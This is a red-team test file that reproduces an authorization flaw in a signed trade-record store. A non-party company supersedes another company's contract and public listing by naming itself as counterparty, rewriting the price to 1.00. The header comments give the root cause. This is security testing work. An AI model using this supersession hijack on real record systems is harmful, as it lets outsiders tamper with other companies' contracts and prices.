// RED-TEAM rt04 (independent repro, written from scratch): a company that is NOT a party to a record
// can supersede (hijack the head of) that record by declaring ITSELF a counterparty in the new envelope.
//
// Root cause chain:
//   - authorizeWrite (records.ts:116-119) checks "issuer is a party" against the NEW envelope's
//     counterparty_ids, which the attacker controls -> attacker lists itself and passes.
//   - the supersession check (records.ts:238-245) validates subject/type/root against the PREVIOUS
//     record but NEVER checks that the issuer was a party to it, and never checks counterparty_ids continuity.
//   - rolesOf (transitions.ts:14-15) then grants the "counterparty" role from that same attacker list, and
//     the same-status branch (transitions.ts:63-68) / no-status branch (54-59) permits "any party".
//
//   node --test tests/redteam/rt04_stranger_supersede.test.ts
import test from "node:test";
import assert from "node:assert/strict";
import { setup, makeCompany, draft, nowIso, log, type Env } from "./rt-helpers.ts";
import { contractBody } from "../helpers.ts";

let env: Env;
test.before(async () => { env = await setup(); });
test.after(async () => { await env.close(); });

test("CRIT: a stranger rewrites a contract between two other companies via same-status supersede", async () => {
  const buyer = await makeCompany(env.base, "wb-x-buyer");
  const seller = await makeCompany(env.base, "wb-x-seller");
  const stranger = await makeCompany(env.base, "wb-x-stranger"); // no relationship to the contract

  // buyer + seller have a private-ish contract (visibility counterparties). Attacker knows its ids
  // (out of band, or because many record types default to public visibility).
  const g = draft({
    type: "trade.contract",
    subject_company_id: buyer.id,
    counterparty_ids: [seller.id],
    issuer: { key_id: buyer.kp.keyId, company_id: buyer.id, module_id: null },
    visibility: "counterparties",
    body: contractBody(buyer.id, seller.id, { status: "active", price_per_unit: { amount: "42.00", currency: "USD" } }),
  });
  const head = (await buyer.client.sign(g, buyer.kp.secretKey)).record;
  log("victim head", { record_id: head.record_id, price: (head.body as any).price_per_unit, cps: head.counterparty_ids });

  // ATTACK: stranger supersedes, keeping subject=buyer (required by the chain check) but replacing the
  // counterparty list with ITSELF, keeping status "active" (same-status revision), and rewriting the price.
  const record_id = crypto.randomUUID();
  const tampered = {
    record_id,
    root_id: head.root_id,
    type: "trade.contract",
    namespace: "trade",
    schema_version: "0.2",
    subject_company_id: buyer.id,               // must match the victim chain
    counterparty_ids: [stranger.id],            // attacker injects itself as the "party"
    issuer: { key_id: stranger.kp.keyId, company_id: stranger.id, module_id: null },
    visibility: "counterparties",
    created_at: nowIso(),
    supersedes: head.record_id,
    body: { ...head.body, price_per_unit: { amount: "1.00", currency: "USD" }, total_value: { amount: "120.00", currency: "USD" } },
  };
  const r = await stranger.client.sign(tampered as any, stranger.kp.secretKey);
  log("attacker new head", { issuer: r.record.issuer.company_id, price: (r.record.body as any).price_per_unit, cps: r.record.counterparty_ids, is_head: r.record.is_head });

  assert.equal(r.created, true, "store accepted a supersede from a non-party stranger");
  assert.equal(r.record.issuer.company_id, stranger.id, "the new head is issued by the stranger");
  assert.equal((r.record.body as any).price_per_unit.amount, "1.00",
    "CONFIRMED: a stranger rewrote the price on the head of a contract it was never a party to");

  // And the original head is now superseded: reading as the real buyer shows the attacker's version.
  const nowHead = await buyer.client.getRecord(r.record.record_id);
  assert.equal((nowHead.body as any).price_per_unit.amount, "1.00");
});

test("CRIT-2: same hijack on a public trade.listing (attacker can even READ the target first)", async () => {
  const seller = await makeCompany(env.base, "wb-l-seller");
  const stranger = await makeCompany(env.base, "wb-l-stranger");

  // A public listing. Its ids are readable by anyone, so the attacker needs no out-of-band knowledge.
  const listingBody = {
    seller_company_id: seller.id,
    goods: contractBody(seller.id, seller.id).goods,
    pack_structure: { pack_levels: [], base_unit: "case" },
    delivery: contractBody(seller.id, seller.id).delivery,
    pricing: { price_per_unit: { amount: "42.00", currency: "USD" }, min_order_quantity: null, price_breaks: [], incoterms: null },
    finance: null, freight: null, certifications: [],
    available_from: nowIso(), expires_at: nowIso(), status: "active",
  };
  const g = draft({
    type: "trade.listing",
    subject_company_id: seller.id,
    counterparty_ids: [],
    issuer: { key_id: seller.kp.keyId, company_id: seller.id, module_id: null },
    visibility: "public",
    body: listingBody,
  });
  let head;
  try {
    head = (await seller.client.sign(g, seller.kp.secretKey)).record;
  } catch (e) {
    // listing body schema is strict; if this fixture body is rejected, the finding still stands via the
    // contract repro above. Skip cleanly.
    log("CRIT-2 skipped (listing fixture rejected by schema)", (e as Error).message.slice(0, 160));
    return;
  }

  const record_id = crypto.randomUUID();
  const tampered = {
    record_id, root_id: head.root_id, type: "trade.listing", namespace: "trade", schema_version: "0.2",
    subject_company_id: seller.id, counterparty_ids: [stranger.id],
    issuer: { key_id: stranger.kp.keyId, company_id: stranger.id, module_id: null },
    visibility: "counterparties", created_at: nowIso(), supersedes: head.record_id,
    body: { ...head.body, pricing: { ...(head.body as any).pricing, price_per_unit: { amount: "1.00", currency: "USD" } } },
  };
  const r = await stranger.client.sign(tampered as any, stranger.kp.secretKey);
  log("CRIT-2 attacker head", { issuer: r.record.issuer.company_id, price: (r.record.body as any).pricing.price_per_unit });
  assert.equal((r.record.body as any).pricing.price_per_unit.amount, "1.00",
    "CONFIRMED: a stranger rewrote another company's public listing");
});
